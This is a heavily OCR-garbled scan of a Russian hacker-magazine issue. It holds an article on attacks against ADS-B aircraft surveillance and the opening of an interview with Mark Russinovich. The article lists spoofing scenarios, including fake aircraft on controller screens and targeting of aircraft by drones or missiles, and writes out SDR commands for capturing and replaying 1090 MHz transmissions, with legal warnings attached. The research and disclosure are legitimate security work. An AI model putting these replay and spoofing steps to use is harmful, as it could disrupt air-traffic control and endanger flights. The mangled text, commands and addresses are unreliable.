радаров стоят в 10-20 раз больше, чем оборудование, основанное 



ОБ АВТОРЕ ИССЛЕДОВАНИЯ 



Андрей изданный момент живет во Франции и пишет докторскую 
работу в институте ЕІІНЕСОМ по теме безопасности встраиваемых 
устройств. Многие о нем не слышали, и это даже хорошо :). Но некото- 
рые люди знают его либо как автора МРСІІК (утилиты по взламыванию 
ключей к 500 миллионам РРЮ-карт МіРаге Сіэббіс, используемых 
почти везде —от метро и автобусов до входов в разного рода «ин- 
тересные» объекты), либо как Мистера Принтер из-за его докладов 
по уязвимостям и эксплоитации принтеров. 

Многие предполагают, что спонсировали это исследование либо 
военные, либо трехбуквенные «страховые» агентства. Как это часто 
бывает, сработала комбинация любопытства и скуки на предыдущих 
местах работы (Андрей работал до Е11РЕСОМ совсем не в сфере ком- 
пьютерной безопасности, хотя увлекался ею), а она всегда получается 
магической :). Прочитал новость, просмотрел форумы, долго пригля- 
дывался к устройству по приему (тогда все стоили от 350 евро, а йѴВ-Т 
донгл гІІ-БсІг за 25 евро, который можно перепрошить, был еще «не 
найден»). Потом подарил сам себе набор правильных игрушек, ну 
и пошло-поехало :), благо ІІ5РР1 уже имелся от предыдущих РРЮ- 
и СБМ-экспериментов. 

Р. 5. Бывает, спрашивают, поэтому отвечу всем: увы, нет, я не тот 
Андрей Костин, я не управляю ВТБ и не дружу с Владимиром. И даже 
не родственник:). 



на новых технологиях. В-третьих, точность обнаружения воздушного 
судна (далее — ВС) уже не соответствует требованиям и стандартам 
безопасности и эффективности воздушного движения, а внедрение 
систем геолокации типа 6Р5/ГЛ0НАСС в ПРН/ВРН либо невозможна, 
либо очень затратна, либо просто не имеет смысла. По этим и по ряду 
других причин в 2002 году стартовала глобальная программа по раз- 
работке и продвижению новых воздушных технологий, которые 
должны к 2020 году полностью заменить старые системы воздуш- 
ного наблюдения. Часть этой новой технологической платформы, 
отвечающая за наблюдение за воздушным потоком, называется 
АйБ-В — для нас в рамках сегодняшней темы эта технология являет- 
ся ключевой. 



ЧТО ТАКОЕ АР5-В И ЗАЧЕМ ОНА НУЖНА 



АОБ-В — это акроним от Аиіотаііс Оерепсіепі БигѵеіІІапсе — 
ВгоасІсаБІ. Более детально АОБ-В расшифровывается как: 

• Аиіотаііс/автоматическое — работает автоматически и нетребует 
вмешательства оператора; 

• йерепсіепі/зависимое — зависит от системы 6Р5/ГЛ0НАСС; 

• БигѵеіІІапсе/наблюдение — обеспечивает наблюдение за самоле- 
том; 

• ВгоасісаБІ/радиовещание — широковещательная непрерывная 
радиотрансляция данных всем принимающим на данной радиоча- 
стоте приемникам. 

Главным пунктом при разработке АбБ-В является возможность 
«видеть» с наибольшей точностью движение воздушных судов благо- 
даря системам позиционирования 6Р5/ГЛ0НАСС. В результате более 
точного позиционирования воздушных судов удается достичь повы- 
шенной безопасности полетов, более компактного и эффективного 
использования воздушного пространства. 

Лучший способ понять, что представляет собой технология, — 
открыть сайт РІідМгагіаг24 ( ѵѵѵт.ИідНігасІаг24.сот )- где в реальном 
времени на карте отображаются перемещения огромного количе- 
ства самолетов — радар авиадиспетчера, но у каждого дома. Если 
знать, что мама прямо сейчас летит из Женевы в Москву рейсом 



ХАКЕР 01 /168/2013 



019 





С0ѴЕК5Т0КѴ 





ЧЕТЫРЕ СУДЬБОНОСНЫЕ ЦИФРЫ 



Пару слов о транспондерах и параметрах ВРН/55Р. Это коды от 0000 
до 7777 в восьмеричной системе счисления. Они применяются 
главным образом для двух целей. Нижний диапазон используется 
для уникального обозначения и идентификации самолетов в старых 
радарных системах. Часть верхнего диапазона — это дискретные 
коды, и они обозначают состояние воздушного судна. Например, пилот 
может сообщить о захвате судна путем передачи транспондерного 
кода 7500. Немало случаев, когда вызывались антитеррористические 
наземные процедуры из-за глупых ошибок или неправильного об- 
ращения пилотов с техникой. 

Пакет с такими транспондерными кодами и данными может вы- 
глядеть примерно так: 

[№)Ро5] : 

АРБ : А18149 ВЕС: N19630 ПТ: АН: 900 КСТ: 2012-10-18 
22:25:35 ТѴР: С172 5(2К: 7600 
[ 10/18/2012 @ 3:26:23 РМ ] 

Коды 7500, 7600, 7700 посылаются самолетами в случае захвата 
самолета или других угроз на борту, а код 7777 имеет специальный 
статус, и транслировать его невоенным судам категорически запре- 
щено. Поэтому, хотя ничто не мешает злоумышленнику передать такие 
данные, предупреждаю — это противозаконно. 



51)2383, то с определенной вероятностью можно посмотреть, где 
находится самолет, на какой высоте и с какой скоростью пере- 
мещается. В основе сервиса как раз лежит технология АйБ-В, 
но откуда она получает данные, мы расскажем чуть позже. Главное 
сейчас — уяснить, что все, кто причастен к воздушному движе- 
нию, благодаря этой технологии стали гораздо лучше понимать, 
что происходит в воздухе. Тут надо добавить, что система АйБ-В 
также может передавать пилотам в режиме реального времени 
информацию о погоде (Н5-В) и дополнительную информацию о воз- 
душном движении (ТІ5-В), что позволяет значительно расширить 
осведомленность о ситуации и повысить безопасность полетов. 

Несмотря нато чтоА05-В представляетсобой сравнительно 
новую технологию, она уже является довольно активной частью 
всемирной системы контроля и управления воздушным движени- 
ем и в перспективе должна полностью заменитьстарые радарные 
системытипа ПРН/ВРН. 



ПРИНЦИПЫ РАБОТЫ АР5-В 



По сути, АРБ-В — это технологическое решение, которое способно 
автоматически определять точные координаты воздушного судна 
и затем транслировать их в эфир вместе с другими данными о поле- 
те — как в наземные центры диспетчерам, так и другим самолетам. 

Для определения точных координат объекта используется при- 
емник 6Р5/ГЛ0НАСС. Остальные данные — тип ВС, скорость, номер 
ВС, рейс, курс, вертикальная скорость — собираются с бортовых 
сенсоров и приборов, таких как система управления полетом (РІідМ 
Мападеплепі Бузіет — РМ5), инерциальная система отсчета (Іпегііаі 
Ве^егепсе Бузіет — ІР5), навигационная система определения 
курса и углового пространственного положения (АКіІигіе апсі Неагііпд 
Ве^егепсе Бузіет — АНВ5) и система воздушных данных (Аіг йаіа 
Бузіетз — АйБ), комбинируются и затем передаются по каналам 
АОБ-В примерно раз в секунду. 

Эта информация передается либо через модифицированный 
транспондер режима С АРБ-В, так называемый МосіеБ 1090Е5, веща- 
ющий на частоте 1 090 МГц, либо через универсальный приемоответ- 
чик, так называемый ІІАТ (ІІпіѵегзаІ Ассезз Тгапзсеіѵег), вещающий 



Первичные радары наблюдения 



Переданный сигнал 



Полученный сигнал 

Вращающаяся Обратное рассеяние 
антенна 





Вторичные радары наблюдения 



Вращающаяся 

антенна 



Пі 



ій запрос 



Полученный ответ 




Транспондер ВРН ♦ 

Внешняя антенна + 

Панель управления кабиной 



Устройство старых радарных систем наблюдения 



на частоте 978 МГ ц. Радиус распространения информации на обеих 
частотах по спецификациям примерно 200 морских миль. 

В целях контроля и координации воздушного потока эту инфор- 
мацию получают другие ВС, наземные станции и наземные суда, 
оборудованные АРБ-В. Наземные станции могут эффективно комби- 
нировать информацию с обеих частот 1 090 и 978 МГц, а также могут 
добавлять дополнительную информацию, полученную от наземных 
радаров для не-АРБ-В-устройств, и потом ретранслируют данные 
для всех ВС в радиусе обслуживания. Дополнительной возможностью 
является обработка и посылка данных в разные онлайн-системы 
для более детального отображения и анализа. 

АРБ-В работает в режиме радиовещания, а это означает, что до- 
ступ к информации АРБ-В бесплатен и свободен для всех. Не секрет 
также и то, что полную информацию АРБ-В могут принимать и радио- 
любители, которые это уже успешно делают много лет, а потом 
собирают все глобальные данные воедино и отображают глобальную 
картину полетов и местонахождения воздушных судов на сайтах, 
подобных проекту РІідМгагіаг24, о котором мы говорили выше. Уни- 
версальность и открытость передачи данных хороша для внедрения 
решений от разных производителей, но у нее есть множество недо- 
статков с точки зрения инфобезопасности, как и будет рассказано 
в следующем разделе. 



УЯЗВИМОСТИ АРБ-В 



В этом разделе мы расскажем о самых важных уязвимостях, которые 
присутствуют в системе АРБ-В. Как оказалось, — и это по меньшей 
мере удивительно, если не пугающе, — данный протокол не исполь- 
зует никаких средств защиты при передаче данных, как, например, 




Сервис РІідМгасІаг24 показывает карту рейсов в реальном времени 



020 



ХАКЕР 01 /168/2013 










Спуфинг в воздухе 




Общая схема авиакоммуникаций следующего поколения 



шифрование и прочную криптоподпись. И это несмотря на важность 
безопасности полетов и систем поддержки для контроля полетов. 

Во всех А05-В-пакетах присутствуют следующие два поля, пред- 
ставляющие для нас особенный интерес: 

• АігсгаЙ Асісігезз (АА), в котором указывается глобальноуникаль- 
ный идентификатор ВС. Аналогично ІМБІ на БІМ-карте или МАС- 
адресусетевой карты (да, авторы знают, что МАС-адрес можно 
подменить:)). 

• Рагііу Іп^огтаііоп (РІ), которое содержитинформацию для кон- 
троля битной четности, или Рагііу Іп^огтаііоп (РІ). 

Хотя наличие последнего поля, на первый взгляд, предохраняет 
пакеты от сторонней, случайной или злонамеренной, манипуляции, 
но это вовсе не так. Данное поле может только подсказать, были ли 
допущены случайные ошибки при передаче данных. С другой сторо- 
ны, злоумышленник, вредоносно манипулирующий данными, может 
просто и легко пересчитать контрольную сумму РІ, получая в итоге 
вполне здоровый и валидный пакет АйБ-В. 

Глобальность идентификатора ВС и уникальность имеют другое 
последствие — существенно ослабляется безопасность А05-В 
с точки зрения конфиденциальности. Очевидно, это позволяет от- 
слеживать данные всех самолетов в режиме реального времени. Это 
первый очевидный фейл технологии. 

Второй тип уязвимостей связан с отсутствием механизмов 
для прочной криптоподписи. Нетрудно понять, что самое главное 
в этой уязвимости — это возможность посылать в эфир поддельные 
данные или подменивать информацию в настоящих пакетах, а самое 
неприятное — это тот факт, что сторона, принимающая данные 
пакеты, не может быть уверена ни в подлинности пакета, ни в иден- 
тификации посылающего, ни в отсутствии зловредных изменений 
в некоем изначально подлинном пакете. 

Третий вид уязвимостей связан с отсутствием криптования на па- 
кетном уровне. Систему для АйБ-В для применения в мирных целях 
сделали некриптованной по ряду технических причин. Во-первых, 
возможности оборудования для АйБ-В недостаточны для ресурсо- 
емких криптоопераций. Во-вторых, существуют издержки на уровне 
менеджмента криптоключей. Если система будет использовать один 
ключ по системе «зЬагес! зесгеі», то его будет достаточно легко 
вычислить, так как длина пакета невелика и большинство данных 
в пакете можно предсказать. С другой стороны, использование 
инфраструктуры открытых ключей (РКІ) непрактично из-за несколь- 
ких причин: а) взаимодействие между самолетами и наземными 
станциями генерирует большой трафик; б) длина пакета недостаточна 
для эффективной криптозащиты; в) проблематично распространение 
информации о новых, аннулированных и временных ключах/сертифи- 
катах. Хотя были предложены разные облегченные варианты РКІ, эти 
решения еще далеки от их практического использования в динамич- 
ной среде воздушных полетов, и особенно для среды АйБ-В. 



ПЕРЕХВАТ ПЕРЕГОВОРОВ 



В управлении воздушным потоком также используются голосовые ка- 
налы связи, по которым пилоты общаются с диспетчерами. Эти каналы 
связи называют АігЬапсІѴНР. Тут надо сказать, что прием частот АігЬапсІ 
ѴНР свободно разрешен, а данные никак не шифруются. Для приема 
необходимо оборудование типа Реаіізііс РКО-22/34/74, ІСОМ, Маѵісот 
ІС-А22 и подобное, чем пользуется огромное сообщество любителей, 
которые выкладывают в общий доступ перехваченные переговоры 
(например, на га Ьіобсаппег.ги) . Столь высокую популярность легко 
объяснить: цена на подходящие на еВау рации начинается от $30-50 (за 
простой китайский вариант). Находятся и смельчаки пошуметь в эфире, 
что во многих странах уголовно наказуемо. Передача без соответству- 
ющей лицензии противозаконна. Проще говоря: «Слушать— можно, 
говорить — нет». 

Помимо голосовых переговоров, на частотах АігЬапсІ ѴНР передают- 
ся также технические данные, но в более узких диапазонах: 

• голосовые частоты: 1 08,000/1 1 8,000-1 36,975 МГц; 

• погодные частоты: 161,650-1 63,275 МГц; 

• частоты аварийных маяков: 121,5 МГц (ІАЭ), 243 МГц(МАО),406 МГц. 




СЦЕНАРИИ АТАК НААР5-В 



Начнем с того, что сценариев атак по данной тематике можно при- 
думать уйму и каждый из них потянет на голливудский боевик. Увы, 
наша цель не писать сценарии для боевиков, а рассмотреть техноло- 
гические проблемы и расписать пару более или менее реалистичных 
атак на базе АРБ-В. 

Например, атака на неконфиденциальность данных и глобально 
уникальные статические идентификаторы адресов ВС. Перехва- 
тывая АА, можноследитьисключительноза интересными целями, 
такими как АігРогсеОпе или личные самолеты голливудских звезд. 
А если все это еще интегрировать с публично доступными базами 
данных, детально расписывающих личные данные владельцев 
ВС (еп.ѵѵікі регііа.огд/ѵѵікі/АігсгаК гедізігаііоп ). то, естественно, 
можно получить интересную картину, показывающую, кто из вла- 
дельцев (часто миллионеры, звезды, главы корпораций) где нахо- 
дится и куда передвигается. Это в какой-то мере сравнимо с ситу- 
ацией, при которой личныеданные регистрации автотранспорта 
станут публично доступными. 

Также злоумышленник может сымитировать на экранах дис- 
петчеров полетов воздушное столкновение самолетов или сге- 
нерировать на экранах диспетчеров пару тысяч несуществующих 
воздушных судов, на базе поддельных данных, но используя реаль- 
ные идентификаторы других судов, что сделает работу диспетчера 
практически невыполнимой. Это может привести к разного рода 
последствиям — от паники в штабе диспетчеров полета до сраба- 
тывания наземных систем по предотвращению террористических 
актов (основанных пока на теоретическом уровне) и вызова срочных 
аварийных служб. 



ХАКЕР 01 /168/2013 



021 







С0ѴЕР5Т0РѴ 



Более пугающий пример атаки легко представить себе с учетом 
того, как быстро развиваются сегодня системы запуска самонаправ- 
ляющихся ракет или дронов на базе приемников АР5-В с заданными 
идентификаторами ВС (АА) в качестве цели. Как можно заметить, 
в этом случае не будут нужны сложные военные технологии по ла- 
зерному или термическому наведению на цель — всего-то необходим 
приемник АРБ-В, приемник 6Р5/ГЛ0НАСС, ну и сама ракета :). 

Атаки на АРБ-В могут, несомненно, стать в несколько раз ин- 
тересней и мощней в контексте уже существующих систем беспи- 
лотных летательных аппаратов ІІАѴ/ІІА5 (ІІптаппесі АегіаІ ѴеЬісІе/ 
Бузіет). Самыми популярными примерами здесь являются МО-1 
Ргебаіог и МО-9 Реарег. Проблема состоит в том, что беспилотные 
системы должны уметь работать автономно в любой ситуации, в том 
числе если связь с оператором нарушена или отсутствует. Это делает 
систему беспилотников крайне и крайне уязвимой к АРБ-В-атакам. 

В данных атаках, возможно, спровоцировать автономный автопилот 
на неправильный, рискованный или выгодный атакующему маневр 
намного легче, чем в случае самолетов, где решения принимают 
не только компьютеры, но и люди. 



ИНСТРУМЕНТЫ ДЛЯ СПУФИНГА 



Возможны ли атаки на практике? Автор статьи уверен в этом, потому 
что сам проводил исследования в своей лаборатории с маломощным 
оборудованием. Но прежде чем говорить о софте и оборудовании, 
позволяющих работать с АРБ-В, спешу предупредить: категорически 
не рекомендуем тесты НЕ в лабораторных условиях, а также тесты 
с мощностью более 100 мВт или с подключенной антенной. Автор 
проводил исследования в изолированной среде. 

Начнем с оборудования. Самый простой тип девайсов для АРБ-В, 
как и для всех других радиотехнологий, — это радиоприемники. 

И он более чем безобиден. Для АРБ-В есть огромное количество 
как любительских версий типа «сделай сам», так и коммерческих 
девайсов с огромной техподдержкой. Справа приведена таблица 
по девайсам, известным автору на данный момент. Отмечу, что в Рос- 
сии существует очень хороший ресурс по технологиям АРБ-В 
Ьлмуу.абвЬгабаг.ги ). на котором можно приобрести большую часть 
этих девайсов. Именно такие приемники используют энтузиасты 
по всему миру и передают данные через АРІ сервису РІідНігасіаг24. 
Перехваченные данные можно визуализировать на домашнем 
компьютере с помощью утилиты РІапеРІоиег ( ѵѵѵѵѵѵ.соаа.со.ик/ 
рІаперІоиег.Ыт ). которая эмулирует экран диспетчера, повторяя 
его внешний вид. 

Но принимать данные — одно, убрать для исследования же нужны 
были более навороченные устройства, которые поддерживают функ- 
ционал передачи данных и могут быть легко запрограммированы 
на модуляцию нужных сигналов, — так называемые БоКѵѵаге Ре(іпес) 
Расііо, или БОР (программные реализации радио). Когда АРБ-В 
только задумывалась, таких устройств не было и мало кто мог пред- 
ставить, что очень скоро их можно будет приобрести за относительно 
небольшие деньги. Самыми популярными являются железки ІІ5РР1/ 



КАК СТАТЬ ЧАСТЬЮ СООБЩЕСТВА 



Если вдруг приобретешь себе АРБ-В-приемник, то ничего не стоит 
стать еще одним провайдером данных для социальных сервисов 
вроде РІідМгасіаг24. Для этого необходимы: 

• собственное оборудование для приема. Например такое [ \л/ѵѵѵѵ. 
і!ідЬІгасіаг24.сот/Ьаггіѵѵаге ). еслиты будешь отсылать данные при 
помощи софтины отЯідМгасіаг24.сот , либо любое другоеустрой- 
ство, поддерживаемое утилитой РІапеРІоиег. 

• специальный софт (поддерживается ѴѴіпсІоѵѵз, Ыпих/АРМ, Мае 05). 
Утилиты от1ІідМгасіаг24.сот или программа РІапеРІоиег. 



Тип 


Наименование 




С0Т5 


РИ-БВР 


ЬІІ.Іѵ/ѴѵРРбх 


С0Т5 


Кіпеііс Аѵіопіс 5В5-1/1еР 


ЬіСІѵ/990кЬѴ 


С0Т5 


АігМаѵРасІагВох 


ЬіІ.Іу/БРМаР 


С0Т5 


РасІагЗасідеІБ АР5В Ѵігіиаі Расіаг 


ЬІ1.Іѵ/сІ90ЕТ5 


С0Т5 


Мосіе-БВеазІ 


ЬИ.1у/ТУ1965 

ЫСІѴ/РІПА2 

ЬіІ.Іѵ/ТУікба 


С0Т5 


5кугас!агАВ5-В 


ЬіІ.Іу/ѴиІІеО 


С0Т5 


Аигога ЕигоІесЬББРх 


ЬіІ.Іѵ/ІІРРѵѵІа 


С0Т5/РУІ 


МісгоАРБВ 


ЬіІ.Іу/ІІ59АоѴ 


РУІ 


тіпіАРБВ 


ЬіІ.Іу/діОзЗТ 


РУІ 


РісАРБВ 


ЫСІѵ/ТРтАсР 


РУІ 


БітрІеАРБВ АТтеда48 


ЬіІ.Іѵ/5РкМВ7 


РУІ 


РРСААР5В(ЬуР1_4МЕА) 


ЬіІ.Іѵ/ОРоРІп 


РУІ 


РІСАРБВ РІС18Р2550(ЬуРІ_4МЕА) 


ЫЫу/НР9гВ1 


РУІ 


АсібЬох 


ЬіІ.Іѵ/1)а40аН 

ЬіСІѵ/ІІхоіОб 



Список АйЗ-В-приемников со ссылками на описание 

ІІ5РР2х, которые стоят до $1500. Однако есть все основания полагать, 
что скоро на свет появится девайс НаскРР, который с тем же функци- 
оналом (но, видимо, с худшим качеством) будет стоить до 300. 

С их помощью «брюки превращаются в шорты», то есть тестовый 
стенд получает возможность посылать в эфир данные АРБ-В с таким 
же успехом, как это делают самолеты и наземные станции. Благо- 
даря тому что многие компоненты радиопередатчика реализованы 
на программном уровне, значительно упрощается работа с конечной 
системой и ее отладка. 

Скажу больше: существует довольно много софта, который позво- 
ляет принимать, демодулировать и декодировать сигналы и пакеты 
АРБ-В. Ниже приведен краткий список проектов, связанных тем или 
иным образом с АРБ-В демодуляцией и декодировкой: 

• бпцгасііо АРБ-В гасііо ( □ііГіцЬ.сот/ЬІ5ІготаіН/аг-аіг-ппосіеБ ); 

• агізЬ-рдг ( сосІе.доодІе.сот/р/асІзЬ-р аг); 

• дг-аіг ( дііЬцЬ.сот/ги5555/дг-аіг ); 

• асІзЬ І сосіе.аоооІе.сот/р/асІБЬ ). 

Однако готовый софт для кодировки и модуляции пока, к счастью, 
отсутствует, и автор тоже не хочет приводить его. Однако процесс 
модуляции мало чем отличается от процесса модуляции сточки 
зрения программной реализации. 

Внимание: передавать таким образом в эфир свои данные АРБ-В 
противозаконно! Источник сигнала будет быстро найден. Вся ин- 
формация приведена исключительно в образовательных целях. 



ЭКСПЕРИМЕНТЫ АВТОРА 



Автор проводил несколько экспериментов в заранее подготовлен- 
ной лаборатории. Запись с демонстрационного стенда доступна 
онлайн: ЫЫу/АРБВ-РЕМО . 

Первый опыт — реализация атаки Реріау Аиаск, когда в эфир 
отправляются (повторяются) ранее перехваченные данные, 
что приводит к появлению двойника. Это самая простая атака, 
которая была реализована на ІІ5РР1 и при помощи открытого про- 
екта ОМРРагііо ( апигабіо.огд ). включающего в себя разные радио- 
примитивы, из которых возможно воспроизвести все, что угодно. 
Как это было сделано? 

Сначала были перехвачены АР5-В-пакеты на частоте 1090 МГц, 
для чего использовался скрипт иЬс!_гх_с(іІе.ру (из пакета бІЧІІВагііо): 



022 



ХАКЕР 01 /168/2013 








Спуфинг в воздухе 



# Перехват данных А05-В 

# ШО-тосІе 

иЬсі_гх_сЯ1е.ру --зрес В:0 --§аіп 25 --затр-гаііе 4000000 - 
-■Р 1090000000 -ѵ ~/САР-ШКЕ_асІ5Ь.-Рс32 

# Рге-ІМ)-ітюсІе 
изгр_гх_сЯ1е.ру 

Далее с помощью скрипта Іх_5атрІе5_*гот_КІе перехваченные 
данные были воспроизведены с использованием бІМІІКабіо: 

# Передача/воспроизведение перехваченных данных АЭ5-В 

# Режим 1М)-тос1е (Ііпіѵегэаі Нагсімаге Огіѵег), в котором 

# может работать ІІ5КР1 

Их_затр1ез_-Ргот_б1е --біе ~/САРТІІКЕ_асІ5Ь.Рс32 ^ 

--ап* "ТХ/КХ" --гаііе 4000000 ---Ргец 1090000000 --Іуре 
Лоа* --зиЬсІеѵ В : 0 
С Рге-ІІНО-тосІе 
изгр_гер1ау_Л1е . ру 

Данные были переданы в эфир с помощью ІІ5ВР1 и были полу- 
чены с помощью находящегося рядом АРБ-В-приемника, после чего 
визуализированы с помощью приложения РІапеРІоиег. Как видно 
на видео, была перехвачена А05-В-трансляция: 




ІСАО 0Х471Р4Е 
ІСАО 0x300174 

Пакеты АйБ-В были отснифаны и действительно повторно 
отправлены в эфир. Если бы это было реализовано в действительно- 
сти, то на экране диспетчера отобразились бы два воздушных судна 
с одинаковым идентификатором. 

Второй эксперимент — проверка возможности перехватить 
А05-В-пакеты и отправить их в эфир в модифицированном виде. 

Для этого был использован МАНАВ и бМІІРасііо: на основе валидных 
перехваченных А05-В-трансляций были сформированы сообщения 
с измененными параметрами. Как видно на видео, были транслиро- 
ваны АЭБ-В пакеты с адресами известными каждому хакеру: 

ІСАО 0ХРЕАО00 
ІСАО 0ХСАРЕ00 
ІСАО 0ХВАВЕ00 

Отображение данных с приемника на экране РІапеРІоиег (это 
видно на видео) доказывает очевидное: из-за отсутствия крипто- 
защиты сообщения А05-В действительно могут быть сформирова- 
ны и отправлены с произвольными значениями параметров. 

Увы, опубликовать весь исходный код невозможно. Важно другое: 
скомбинировав трансивер на базе более дорогого и менее порта- 
тивного ІІ5ВР1/1)5ЯР2х или менее дорогого и более портативного 
НаскВР (когда начнется его продажа) и добавив к этому несложный 
код на С/С++ либо МАНАВ, можно получить универсальное средство 
для двухсторонней работы с АйБ-В. Потенциально такая система мо- 
жет работать и с другими радиотехнологиями, часто используемыми 
в авионике, воздушных и наземно-воздушных системах. 



ЗАКЛЮЧЕНИЕ, ИЛИ ЧТО ДЕЛАТЬ ДАЛЬШЕ? 



Как мы успешно показали во время докладов и рассказали в этой 
статье, положение дел с защищенностью данной системы далеко 
от хорошего, что заставляет задуматься о безопасности полетов уже 
сейчас. Хотя мы и утрировали опасность подобной атаки (все-таки 
в дополнение к новомодной АйБ-В для наблюдения всегда использу- 
ются и проверенные временем радары, которые помогут распознать 
аномалию), но тем не менее проблема в технологии налицо. 

Как неоднократно показывала история, дела в авионике и назем- 
но-воздушных системах обстоят не всегда так гладко, как кажется. 
Пример этому — недавно найденный исследователями из Кембриджа 
хардверный бэкдор в РРбА-чипах, используемый в военных систе- 




1) АігЫаѵ КасІагВох; 2) Аигога ЕигоІесН; 3) Кіпеііс Аѵіопіс 5В5-1; 4) НаскКР; 
5) тісгоА05В-ІР; 6) тітАРЗВ; 7) ВП-50В; 8] тісгоА05В 



мах, а также в тысячах Воеіпд 787. Другой пример — захват военных 
дронов при помощи спуфинга систем навигации типа 6Р5. На фоне 
таких вот «казусов» опасения по поводу безопасности коммуникаций 
в гражданской и военной авиации более чем обоснованны. 

Авторы очень надеются, что их исследования дадут положитель- 
ный импульс развитию безопасного режима АйБ-В. Для этого есть 
хорошие основания — Международная организация гражданской 
авиации создала в конце ноября этого года группу СуЬег Бесигііу Тазк 
Рогсе (СБТР), которая будет использовать в работе результаты наших 
и других подобных исследований. 

Дальнейшие исследования автора будут посвящены другим 
компонентам систем коммуникаций в авиации, в частности системе 
предупреждения столкновения самолетов (ТгаКіс СоІІізіоп Аѵоісіапсе 
Бузіет, ТСА5), что тоже обещает быть увлекательным. Следите за но- 
востями — и приятных и безопасных полетов и мягкой посадки, куда 
бы вы ни летали! □□ 



АІРРОКСЕ ОЫЕ 



В этом контексте вспоминается история с появлением на пользователь- 
ских и интернет А05-В радарах самолета под названием АігРогсеОпе— 
а это ни много ни мало самолет президента США. Сам факттого, что 
этот самолет засветился на обычных радарах, парадоксален, так как 
АігРогсеОпе оборудован военными средствами связи и должен ис- 
пользовать шифрованную версию АбБ-В и МосІеБ под названием «Мосіе 
5 Сгуріо Арріщие». Если данные, пойманные радаром, реальные, то 
зачем АігРогсеОпе было давать всем о себе знать? Если же данные на 
радарах были результатом спуфа, значит ли это, что кто-то уже активно 
атакует систему АйБ-В? По этому факту, к сожалению, ни один ответ не 
будет ни хорошим, ни правильным. 



ХАКЕР 01 /168/2013 



023 







С0ѴЕК5Т0КѴ 



«Титулы» Марка Руссиновича 
можно перечислять долго — про- 
граммист, специалист по вну- 
треннему устройству ѴѴіпсіоѵѵб, 
писатель, автор многочисленных 
статей, ТесЬпісаІ РеІІоѵѵ в МісгозоК. 
И сложно посчитать, сколько раз 
мы упоминали в своих статьях 
РгосМоп, РіІеМоп и другие неза- 
менимые утилиты, которые он раз- 
работал. И вот на конференции 
ТесНЕсІ 2012 нам удалось лично 
встретиться с этим интересным 
и многогранным человеком. 



Беседовал Степан Ильин 



ФАКТЫ 



Родился в 1966 году 
в Испании. 

Выпускник университета 
Карнеги-Меллона, об- 
ладатель степеней бака- 
лавра и доктора в области 
вычислительнойтехники. 
В 2006 году вошел втоп-5 
хакеров планеты по вер- 
сии журнала еІА/еек. 
Работал в ІВМ какэксперт 
по операционным систе- 
мам. 

Написал драйвер файло- 
вой системы ЫТР5 под 005. 
В 2005 году нашел руткит 
на диске 5опу ВМС Ми$іс 
Епіегіаіптепі, из-за чего 
буквально «проснулся 



.44 



Удочерил девочку 
из Москвы. 



КАК СОЗДАВАЛСЯ 




















Интервью с Марком Руссиновичем 



МАРК РУССИНОВИЧ 
ОСНОВАТЕЛЬ 5Ѵ5ІМТЕКЫАІ.5 



СВОДИМ ФАЙЛЫ ВМЕСТЕ 



Если оглянуться назад и вспомнить, с чего я на- 
чинал, можно заметить множество предпосылок 
к тому, чем я занимаюсь сейчас. 

Моим первым компьютером был Арріе 

II. И первое, что я с ним сделал, — расковы- 
рял ВОМ-память, отреверсив ее, и придумал, 
как можно ее расширить. 

Я прекрасно помню этот момент. Я учился 
в шестом классе и пришел к другу домой. Его 
отец работал в университете и принес домой 
Арріе II. Мой друг сказал: «У моего папы есть 
персональный компьютер, пойдем посмотрим!» 
Мы пошли и стали играть с ним. Так все и на- 
чалось. До этого я хотел стать инженером-ави- 
аконструктором, но после нескольких часов, 
проведенных за компьютером, передумал 
и решил — хочу работать в ІТ. 

Позже я принялся писать статьи в журналы 
и программировать приложения. Статьи были 
на тему «Как расширить ПОМ», а програм- 
мы —для распечатки изображения с экрана 
на принтере. С этого я начинал и, по сути, сейчас 
занимаюсь тем же. 

В то время программы писали на Вазіс, 
но если хотелось создавать по-настоящему 
сложные вещи, нужно было переходить 
на машинный язык. А машинный язык — это 
просто числа, поэтому сначала нужно было 
написать ассемблер, чтобы запрограммировать 
пакет инструкций для компьютера. Затем нужен 
был дизассемблер, чтобы получить из машин- 
ного языка обратно код программы. Я написал 
для себя и дизассемблер, и ассемблер. 

Меня всегда интересовало, как работает 
компьютер. Мне хотелось заставить его делать 
вещи, которые обычный программист не мо- 
жет. Для этого я и разработал многие из утилит 
Бузіпіегпаіз. 

Как только я решил, что хочу заниматься 
компьютерами, я понял, что хочу узнать об этом 
все, что только можно. Настолько полно, 
насколько смогу. Тогда же пришло решение, 
что хочу получить образование в этой области. 
Однако я хотел изучать не просто науку, которая 
часто уходит в теорию и абстрактные идеи, 
но и практическое ее применение, где соединя- 
ются аппаратное и программное обеспечение. 

Я получил степень бакалавра, затем ма- 
гистра, а затем и доктора по вычислительной 
технике. Свои знания я приложил к созданию 
утилит и приложений — попытался создавать 
коммерческие программные продукты из идей, 
которые пришли ко мне в процессе работы над 
докторской. Но у меня ничего не вышло. 

Когда ничего не получилось, я пошел 
на работу в компании, специализирующие- 
ся на создании программного обеспечения, 
и использовал знания, полученные уже там. 
Первой компанией, где я работал, стала 



МиМеда ТесЬпоІодіез. Некоторое время я был 
в команде, которая занималась легендарным 
отладчиком БоКІСЕ Ія очень часто использовал 
эту программу для реверсивной инженерии под 
ѴѴіпбоѵѵз и 005). 



КУЛЬТ МЯГКОГО ЛЬДА 



Когда я пришел в ЫиМеда ТесЬпоІодіез, у них 
было всего два программных продукта: БоКІСЕ 
и ВоипсІзСЬескег. Дебаггер и утилита для про- 
верки корректного использования памяти 
и АРІ-вызовов. Это большие и успешные про- 
екты. Однако компанию в будущем собирались 
продать, а для продажи им было необходимо 
иметь больше удачных продуктов. Руководство 
сказало: «Мы еще не придумали, каким будет 
наш следующий проект, но мы хотим, чтобы 
у нас были люди, готовые взяться за него, 
как только мы придумаем». Именно поэтому они 
наняли меня. 

У меня было много свободного времени. 

По сути, мне дали такую задачу: «Пока мы 
работаем над следующей идеей, почему бы тебе 
не поработать над БоКІСЕ? Добавь туда несколь- 
ко команд, напиши документацию». Тогда у меня 
действительно появилось много свободного 
времени, и именно тогда я начал заниматься ис- 
следованиями и писать различные утилиты. 

Когда я начал работать в компании, там 
трудилось всего около тридцати человек. Ком- 
пания еще была маленькая и только начинала 
расти. Основатели МиМеда (Фрэнк Гросман 
и Джим Москан) хотели в конце концов продать 
ее, так что они нанимали все больше людей, 
и компания мало-помалу становилась более 
организованной. 

В МиМеда ТесЬпоІодіез была очень классная 
хакерская атмосфера, но я проработал там 
